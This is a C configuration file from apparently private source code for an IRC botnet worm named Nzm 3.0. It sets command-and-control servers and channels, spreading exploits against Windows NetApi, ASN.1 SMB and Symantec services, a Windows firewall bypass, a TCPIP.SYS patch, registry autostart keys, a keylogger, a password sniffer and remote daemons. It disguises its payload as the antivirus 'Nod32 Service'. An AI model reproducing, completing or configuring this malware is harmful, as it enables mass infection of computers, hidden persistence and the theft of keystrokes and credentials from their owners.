/*
         Nzm 3.0 Released By Ph3mt
  **************************************
  * Added Netapi And Symantec Exploits *
  * TCPIP.SYS Patch For SP2 Scan ;]    *
  * And Firewall AutoBy Pass           *
  * Do Not Distribute, Very Priv8      *
  * Nice Work lammor ;>                *
  **************************************

*/

int port = 3921;				// server port
int port2 = 4001;				// backup server port
int socks4port = 6098;			// Port # for sock4 daemon to run on  - CHANGE THIS!!!
int tftpport = 69;				// Port # for tftp daemon to run on
int tftpdport = 68;				// Port # for ftpd daemon to run on
int httpport = 8999;			// Port # for http daemon to run on
int rloginport = 33332;			// Port # for rlogin daemon to run on
BOOL topiccmd = TRUE;			// set to TRUE to enable topic commands
BOOL rndfilename = FALSE;		// use random file name
BOOL AutoStart = TRUE;			// enable autostart registry keys
char prefix = '.';				// command prefix (one character max.)
int maxrand = 7;				// how many random numbers in the nick
int nicktype = DNICK;	    	// nick type (see rndnick.h)
BOOL nickprefix = TRUE;         // nick uptime & mirc prefix
BOOL PatchTCPIP = TRUE;         // TCPIP.SYS patch
BOOL BypassFW = TRUE;			// Windows Sp2 firewall bypass

#ifdef DEBUG_LOGGING
char logfile[]="c:\\systempnps.SYS";
#endif

#ifndef NO_CRYPT // Only use encrypted strings or your binary will not be secure!!

#else  // Recommended to use this only for Crypt() setup, this is unsecure.

char lsaip[] = "";                    // cftp host ".lsahost 192.168.1.1"
char lsaport[] = "4492";			// cftp port ".lsaport 6969"
char lsuser[] = "ph3mt";
char lspass[] = "work";

// these have been tested and give best results, DON'T CHANGE!

SCANALL scanall[]={
{"sym", true},
{"napi445", true},
{"napi139", true},
{"asn1smb", true},
{NULL, false}
};

//
BOOL sp2_mod = TRUE;			        	// sp2mod
char botid[] = "rootz";						// bot id
char version[] = "NzM Version 3.0 Ph3mt";	// Bots !version reply
char password[] = "";					    // bot password
char server[] = "";		                    // server
char serverpass[] = "";						// server password
char channel[] = "";				        // channel that the bot should join
char chanpass[] = "";						// channel password
char server2[] = "";						// backup server (optional)
char channel2[] = "";						// backup channel (optional)
char chanpass2[] = "";						// backup channel password (optional)
char filename[] = "nod64.exe";			    // destination file name *** your payload should match this too ***
char keylogfile[] = "Windows06.sys";		// keylog filename
char valuename[] = "Nod32 Service";		    // value name for autostart
char nickconst[] = "[lol]";					// first part to the bot's nick
char szLocalPayloadFile[]="nod64.exe";	    // **** make this the same as your bot filename! ****
char modeonconn[] = "-x+i";					// Can be more than one mode and contain both + and -
char exploitchan[] = "";					// Channel where exploit messages get redirected
char keylogchan[] = "";						// Channel where keylog messages get redirected
char psniffchan[] = "";						// Channel where psniff messages get redirected
char techchan[] = "";                       // Channel where patcher messages get redirected
char vncchan[] = "";                        // Channel where vncscan messages get redirected

char *authost[] = {
	"*@*"
};

char *versionlist[] = {
	"iroffer v1.3b10 [D&P 23874155], http://iroffer.org/",
	};

char regkey1[]="Software\\Microsoft\\Windows\\CurrentVersion\\Run";
char regkey2[]="Software\\Microsoft\\Windows\\CurrentVersion\\RunServices";
char regkey3[]="Software\\Microsoft\\OLE";
char regkey4[]="SYSTEM\\CurrentControlSet\\Control\\Lsa";

#endif

#ifdef PLAIN_CRYPT
char key[16] = "34utm.098v-54òyhv90um6uyh80v9845j9tc,053jlòyht9vm4j5yv_cript_farco_dsafkj.rhgop"; // CHANGE THIS!!! hmmm..Do I even need this now?
#endif


